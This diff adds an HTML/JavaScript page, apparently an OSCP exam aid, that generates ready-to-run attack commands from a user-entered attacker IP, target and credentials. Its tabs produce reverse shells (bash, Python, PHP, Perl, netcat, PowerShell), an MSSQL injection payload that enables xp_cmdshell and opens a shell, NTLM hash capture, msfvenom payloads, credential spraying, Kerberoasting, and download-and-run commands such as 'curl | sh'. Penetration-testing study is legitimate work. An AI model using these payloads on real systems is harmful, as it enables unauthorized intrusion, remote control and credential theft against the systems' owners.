@@ -1,0 +1,199 @@
+<!doctype html>
+<html lang="en" data-theme="dark">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>OSCP Command Generator</title>
+<style>
+:root{
+  --bg:#0d1117; --panel:#11161d; --panel2:#161c24; --hover:#1b2531;
+  --text:#c9d3de; --head:#e8eef5; --muted:#7d8794; --faint:#5a6472;
+  --accent:#4f9cf9; --accent-soft:#1a2942; --good:#56d364; --border:#20262e; --border2:#2a323c;
+  --code:#0a0e13; --tag:#56d364;
+}
+html[data-theme="light"]{
+  --bg:#f6f8fa; --panel:#fff; --panel2:#eef1f4; --hover:#e7ecf1;
+  --text:#24292f; --head:#0f1419; --muted:#57606a; --faint:#8b949e;
+  --accent:#0969da; --accent-soft:#ddf0ff; --good:#1a7f37; --border:#d8dee4; --border2:#cdd5dd;
+  --code:#f2f4f7; --tag:#1a7f37;
+}
+*{box-sizing:border-box}
+body{margin:0;background:var(--bg);color:var(--text);
+  font:15px/1.5 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif}
+.wrap{max-width:1000px;margin:0 auto;padding:16px 18px 100px}
+h1{font-size:19px;color:var(--head);margin:0 0 2px}
+.sub{color:var(--faint);font-size:12px;margin-bottom:14px}
+/* inputs bar */
+#bar{position:sticky;top:0;z-index:10;background:var(--panel);border:1px solid var(--border);
+  border-radius:12px;padding:12px 14px;margin-bottom:14px;display:flex;gap:12px;flex-wrap:wrap;align-items:flex-end;
+  box-shadow:0 2px 10px rgba(0,0,0,.25)}
+.f{display:flex;flex-direction:column;gap:3px}
+.f label{font-size:10.5px;text-transform:uppercase;letter-spacing:.5px;color:var(--muted);font-weight:700}
+.f input{background:var(--panel2);border:1px solid var(--border2);color:var(--head);border-radius:8px;
+  padding:8px 10px;font-size:14px;font-family:"SFMono-Regular",Consolas,monospace;outline:none;width:150px}
+.f input:focus{border-color:var(--accent)}
+.f input.lhost{border-color:var(--accent);width:160px}
+.f.wide input{width:190px}
+#bar .grow{flex:1}
+.tbtn{background:var(--panel2);color:var(--muted);border:1px solid var(--border2);border-radius:8px;
+  padding:7px 10px;cursor:pointer;font-size:12px}
+.tbtn:hover{color:var(--head)}
+/* tabs */
+#tabs{display:flex;gap:7px;flex-wrap:wrap;margin-bottom:16px}
+.tab{background:var(--panel);border:1px solid var(--border);color:var(--muted);border-radius:20px;
+  padding:7px 14px;cursor:pointer;font-size:13px;font-weight:600}
+.tab:hover{color:var(--head)}
+.tab.active{background:var(--accent-soft);color:var(--accent);border-color:var(--accent)}
+/* cards */
+.card{background:var(--panel);border:1px solid var(--border);border-radius:11px;margin-bottom:12px;overflow:hidden}
+.card .h{display:flex;justify-content:space-between;align-items:center;padding:9px 14px;gap:10px;border-bottom:1px solid var(--border)}
+.card .h .t{font-size:13px;font-weight:600;color:var(--head)}
+.card .h .d{font-size:11.5px;color:var(--muted);font-weight:400}
+.card .h .tag{font-size:10.5px;background:transparent;color:var(--tag);border:1px solid var(--border2);border-radius:20px;padding:1px 8px;white-space:nowrap}
+.copy{background:var(--accent);color:#fff;border:none;border-radius:7px;padding:6px 13px;cursor:pointer;font-size:12px;font-weight:600;white-space:nowrap}
+.copy:hover{filter:brightness(1.1)} .copy.ok{background:var(--good)}
+pre{margin:0;padding:12px 14px;background:var(--code);overflow:auto;white-space:pre-wrap;word-break:break-all;
+  font:12.5px/1.5 "SFMono-Regular",Consolas,"Liberation Mono",Menlo,monospace;color:var(--head)}
+.note{background:var(--panel);border:1px solid var(--border);border-left:3px solid var(--accent);
+  border-radius:0 8px 8px 0;padding:9px 13px;font-size:12.5px;color:var(--muted);margin-bottom:14px}
+.note b{color:var(--head)}
+@media(max-width:640px){.f input{width:120px!important}}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <h1>⚡ OSCP Command Generator</h1>
+  <div class="sub">Offline · set your IP once → click a tab → Copy the ready-to-run command. Companion to OSCP-KB.html.</div>
+
+  <div id="bar">
+    <div class="f"><label>LHOST (your VPN IP)</label><input id="lhost" class="lhost" placeholder="10.10.14.7"></div>
+    <div class="f"><label>Target ($T / RHOST)</label><input id="rhost" placeholder="10.10.10.5"></div>
+    <div class="f"><label>Port</label><input id="port" value="443" style="width:80px"></div>
+    <div class="f wide"><label>File (for transfer)</label><input id="file" placeholder="linpeas.sh"></div>
+    <div class="f"><label>User</label><input id="user" placeholder="bob" style="width:100px"></div>
+    <div class="f"><label>Pass</label><input id="pass" placeholder="Summer2025!" style="width:130px"></div>
+    <div class="grow"></div>
+    <button class="tbtn" onclick="toggleTheme()">◐ theme</button>
+  </div>
+
+  <div class="note" id="hint"><b>Tip:</b> your LHOST + Port are saved in this browser. Everything below updates live as you type. On a web param, remember to <b>URL-encode</b> reverse shells.</div>
+
+  <div id="tabs"></div>
+  <div id="cards"></div>
+</div>
+
+<script>
+const $=id=>document.getElementById(id);
+function V(){return {L:$('lhost').value||'<LHOST>', R:$('rhost').value||'<TARGET>', P:$('port').value||'443',
+                     F:$('file').value||'<file>', U:$('user').value||'<user>', W:$('pass').value||'<pass>'};}
+
+// UTF-16LE base64 for PowerShell -e
+function ps64(cmd){let b=[];for(let i=0;i<cmd.length;i++){const c=cmd.charCodeAt(i);b.push(c&0xff,(c>>8)&0xff);}return btoa(String.fromCharCode.apply(null,b));}
+function psRev(L,P){const ps=`$client = New-Object System.Net.Sockets.TCPClient("${L}",${P});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;return 'powershell -e '+ps64(ps);}
+
+// category → [ {t:title, d:desc, tag, cmd:(v)=>string} ]
+const CATS={
+ "Reverse Shells":[
+   {t:"Bash",d:"Linux · most common",tag:"[SHELL-QUICK]",cmd:v=>`bash -c 'bash -i >& /dev/tcp/${v.L}/${v.P} 0>&1'`},
+   {t:"Bash (mkfifo)",d:"when bash -i fails",cmd:v=>`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${v.L} ${v.P} >/tmp/f`},
+   {t:"Python3",d:"Linux · gives a pty",cmd:v=>`python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("${v.L}",${v.P}));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'`},
+   {t:"PHP",d:"web / php host",cmd:v=>`php -r '$s=fsockopen("${v.L}",${v.P});exec("/bin/sh -i <&3 >&3 2>&3");'`},
+   {t:"Perl",d:"Linux",cmd:v=>`perl -e 'use Socket;$i="${v.L}";$p=${v.P};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`},
+   {t:"Netcat -e",d:"if nc supports -e",cmd:v=>`nc ${v.L} ${v.P} -e /bin/bash`},
+   {t:"Netcat.exe (Windows)",d:"transfer nc.exe first",cmd:v=>`nc.exe ${v.L} ${v.P} -e cmd.exe`},
+   {t:"PowerShell (base64)",d:"Windows · powershell -e",tag:"[SHELL-WINDOWS]",cmd:v=>psRev(v.L,v.P)},
+   {t:"PowerShell (raw)",d:"Windows · paste in a PS shell",cmd:v=>`powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('${v.L}',${v.P});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s2=$r+'PS '+(pwd).Path+'> ';$sb=[Text.Encoding]::ASCII.GetBytes($s2);$s.Write($sb,0,$sb.Length);$s.Flush()}"`},
+   {t:"socat (full TTY)",d:"target side · best TTY",cmd:v=>`socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${v.L}:${v.P}`},
+ ],
+ "SQLi → RCE (MSSQL)":[
+   {t:"xp_cmdshell → PS reverse shell (FULL login payload)",d:"paste straight into the vulnerable field · uses L/P",tag:"[SQLI-MSSQL]",cmd:v=>`'; EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell '${psRev(v.L,v.P)}';-- -`},
+   {t:"Enable xp_cmdshell only",d:"turn command-exec on",cmd:v=>`'; EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;-- -`},
+   {t:"Run one command",d:"after it's enabled",cmd:v=>`'; EXEC xp_cmdshell 'whoami';-- -`},
+   {t:"Capture NTLM hash",d:"→ Responder ANALYZE / relay",cmd:v=>`'; EXEC xp_dirtree '\\\\${v.L}\\x';-- -`},
+   {t:"Auth bypass",d:"log in as the first user",cmd:v=>`' or 1=1-- -`},
+   {t:"Detect (break the query)",d:"error = injectable",cmd:v=>`'`},
+ ],
+ "Listeners":[
+   {t:"Netcat",d:"catch the shell",tag:"[SHELL-QUICK]",cmd:v=>`nc -lvnp ${v.P}`},
+   {t:"rlwrap Netcat",d:"arrow keys / history",cmd:v=>`rlwrap nc -lvnp ${v.P}`},
+   {t:"socat (full TTY)",d:"your side · pairs with socat rev",cmd:v=>`socat file:\`tty\`,raw,echo=0 tcp-listen:${v.P}`},
+   {t:"Metasploit handler",d:"⚠️ your ONE MSF box only",cmd:v=>`msfconsole -q -x "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set LHOST ${v.L};set LPORT ${v.P};run"`},
+ ],
+ "File Transfer":[
+   {t:"Serve (Kali)",d:"host the current dir",tag:"[FILETRANSFER-QUICK]",cmd:v=>`python3 -m http.server 80`},
+   {t:"SMB server (Kali)",d:"great for Windows",cmd:v=>`impacket-smbserver share $(pwd) -smb2support`},
+   {t:"Linux pull (wget)",d:"on the target",cmd:v=>`wget http://${v.L}/${v.F} -O /tmp/${v.F}`},
+   {t:"Linux pull (curl)",d:"on the target",cmd:v=>`curl http://${v.L}/${v.F} -o /tmp/${v.F}`},
+   {t:"Windows pull (certutil)",d:"on the target",cmd:v=>`certutil -urlcache -split -f http://${v.L}/${v.F} ${v.F}`},
+   {t:"Windows pull (IWR)",d:"PowerShell",cmd:v=>`powershell -c "iwr http://${v.L}/${v.F} -OutFile ${v.F}"`},
+   {t:"Windows pull (WebClient)",d:"old PowerShell",cmd:v=>`powershell -c "(New-Object Net.WebClient).DownloadFile('http://${v.L}/${v.F}','C:\\Windows\\Temp\\${v.F}')"`},
+   {t:"SMB copy (Windows)",d:"after impacket-smbserver",cmd:v=>`copy \\\\${v.L}\\share\\${v.F} .`},
+ ],
+ "TTY Upgrade":[
+   {t:"Python pty (step 1)",d:"then Ctrl-Z",tag:"[SHELL-STABILIZE]",cmd:v=>`python3 -c 'import pty;pty.spawn("/bin/bash")'`},
+   {t:"stty (step 2)",d:"after Ctrl-Z, then Enter twice",cmd:v=>`stty raw -echo; fg`},
+   {t:"set term (step 3)",d:"in the restored shell",cmd:v=>`export TERM=xterm; export SHELL=/bin/bash; stty rows 50 columns 200`},
+   {t:"script alternative",d:"if python missing",cmd:v=>`script -qc /bin/bash /dev/null`},
+ ],
+ "Enumeration":[
+   {t:"Nmap full TCP",d:"all ports fast",tag:"[NMAP-QUICK]",cmd:v=>`nmap -p- --min-rate 2000 -Pn -oN scans/all-tcp.txt ${v.R}`},
+   {t:"Nmap service scan",d:"on the open ports",cmd:v=>`nmap -p<csv> -sCV -Pn -oN scans/scv.txt ${v.R}`},
+   {t:"Nmap UDP top100",d:"catch SNMP/DNS/TFTP",cmd:v=>`nmap -sU --top-ports 100 --min-rate 1000 -Pn -oN scans/udp.txt ${v.R}`},
+   {t:"feroxbuster",d:"web dir brute",tag:"[WEB-QUICK]",cmd:v=>`feroxbuster -u http://${v.R} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html`},
+   {t:"nxc SMB (null)",d:"shares + users",tag:"[SMB-QUICK]",cmd:v=>`nxc smb ${v.R} -u '' -p '' --shares --users`},
+   {t:"enum4linux-ng",d:"one-shot SMB/RPC/LDAP",cmd:v=>`enum4linux-ng -A ${v.R}`},
+   {t:"whatweb",d:"web fingerprint",cmd:v=>`whatweb http://${v.R}`},
+ ],
+ "Cred Spray":[
+   {t:"nxc SMB",d:"validate on SMB",tag:"[CREDENTIALS-QUICK]",cmd:v=>`nxc smb ${v.R} -u '${v.U}' -p '${v.W}' --shares`},
+   {t:"nxc WinRM",d:"(Pwn3d!) = shell",cmd:v=>`nxc winrm ${v.R} -u '${v.U}' -p '${v.W}'`},
+   {t:"nxc every service",d:"validate across all",cmd:v=>`for s in smb winrm ldap mssql rdp ssh; do echo "== $s =="; nxc $s ${v.R} -u '${v.U}' -p '${v.W}' --continue-on-success; done`},
+   {t:"evil-winrm login",d:"get the shell",cmd:v=>`evil-winrm -i ${v.R} -u '${v.U}' -p '${v.W}'`},
+   {t:"Kerberoast",d:"needs any domain cred",tag:"[AD-KERBEROAST]",cmd:v=>`impacket-GetUserSPNs -request DOMAIN/${v.U}:'${v.W}' -dc-ip ${v.R}`},
+ ],
+ "msfvenom":[
+   {t:"Windows exe",d:"non-meterpreter (catch w/ nc)",tag:"[MSF-MSFVENOM]",cmd:v=>`msfvenom -p windows/x64/shell_reverse_tcp LHOST=${v.L} LPORT=${v.P} -f exe -o rev.exe`},
+   {t:"Windows meterpreter",d:"⚠️ MSF box only",cmd:v=>`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${v.L} LPORT=${v.P} -f exe -o met.exe`},
+   {t:"Linux elf",d:"",cmd:v=>`msfvenom -p linux/x64/shell_reverse_tcp LHOST=${v.L} LPORT=${v.P} -f elf -o rev.elf`},
+   {t:"ASPX (IIS)",d:"webshell upload",cmd:v=>`msfvenom -p windows/x64/shell_reverse_tcp LHOST=${v.L} LPORT=${v.P} -f aspx -o sh.aspx`},
+   {t:"WAR (Tomcat)",d:"deploy via manager",cmd:v=>`msfvenom -p java/jsp_shell_reverse_tcp LHOST=${v.L} LPORT=${v.P} -f war -o sh.war`},
+   {t:"MSI (AlwaysInstallElevated)",d:"→ SYSTEM",cmd:v=>`msfvenom -p windows/x64/shell_reverse_tcp LHOST=${v.L} LPORT=${v.P} -f msi -o x.msi`},
+ ],
+ "Privesc download":[
+   {t:"linpeas (in memory)",d:"Linux · no disk",tag:"[LINPEAS-WORKFLOW]",cmd:v=>`curl http://${v.L}/linpeas.sh | sh`},
+   {t:"linpeas (to file)",d:"Linux",cmd:v=>`wget http://${v.L}/linpeas.sh -O /tmp/lp.sh; chmod +x /tmp/lp.sh; /tmp/lp.sh | tee /tmp/lp.txt`},
+   {t:"winPEAS",d:"Windows",tag:"[WINPEAS-WORKFLOW]",cmd:v=>`certutil -urlcache -split -f http://${v.L}/winPEASx64.exe wp.exe & wp.exe`},
+   {t:"PrintSpoofer",d:"SeImpersonate → SYSTEM",tag:"[WINDOWS-TOKENS]",cmd:v=>`certutil -urlcache -split -f http://${v.L}/PrintSpoofer64.exe ps.exe & ps.exe -i -c cmd`},
+   {t:"pspy",d:"watch processes/cron",cmd:v=>`wget http://${v.L}/pspy64 -O /tmp/pspy; chmod +x /tmp/pspy; /tmp/pspy`},
+ ],
+};
+
+let active=Object.keys(CATS)[0];
+function esc(s){return s.replace(/[&<>]/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;'}[c]));}
+function renderTabs(){$('tabs').innerHTML=Object.keys(CATS).map(k=>`<div class="tab ${k===active?'active':''}" onclick="active='${k.replace(/'/g,"\\'")}';renderTabs();renderCards()">${k}</div>`).join('');}
+function renderCards(){
+  const v=V();
+  $('cards').innerHTML=CATS[active].map((c,i)=>{
+    const cmd=c.cmd(v);
+    return `<div class="card"><div class="h"><div><span class="t">${c.t}</span> ${c.d?`<span class="d">— ${c.d}</span>`:''}</div>
+      <div style="display:flex;gap:8px;align-items:center">${c.tag?`<span class="tag">${c.tag}</span>`:''}<button class="copy" data-i="${i}" onclick="copyCmd(this)">Copy</button></div></div>
+      <pre id="cmd${i}">${esc(cmd)}</pre></div>`;
+  }).join('');
+}
+function copyCmd(btn){
+  const txt=$('cmd'+btn.dataset.i).textContent;
+  const done=()=>{btn.textContent='Copied ✓';btn.classList.add('ok');setTimeout(()=>{btn.textContent='Copy';btn.classList.remove('ok');},1200);};
+  if(navigator.clipboard&&navigator.clipboard.writeText){navigator.clipboard.writeText(txt).then(done).catch(()=>fallback(txt,done));}
+  else fallback(txt,done);
+}
+function fallback(txt,done){const ta=document.createElement('textarea');ta.value=txt;ta.style.position='fixed';ta.style.opacity=0;document.body.appendChild(ta);ta.select();try{document.execCommand('copy');done();}catch(e){}document.body.removeChild(ta);}
+
+['lhost','rhost','port','file','user','pass'].forEach(id=>$(id).addEventListener('input',()=>{renderCards();save();}));
+function save(){try{localStorage.setItem('oscp-cg',JSON.stringify({L:$('lhost').value,P:$('port').value}));}catch(e){}}
+try{const s=JSON.parse(localStorage.getItem('oscp-cg')||'{}');if(s.L)$('lhost').value=s.L;if(s.P)$('port').value=s.P;}catch(e){}
+function toggleTheme(){const h=document.documentElement;const t=h.getAttribute('data-theme')==='dark'?'light':'dark';h.setAttribute('data-theme',t);try{localStorage.setItem('oscp-cg-theme',t);}catch(e){}}
+try{const t=localStorage.getItem('oscp-cg-theme');if(t)document.documentElement.setAttribute('data-theme',t);}catch(e){}
+renderTabs();renderCards();
+</script>
+</body>
+</html>
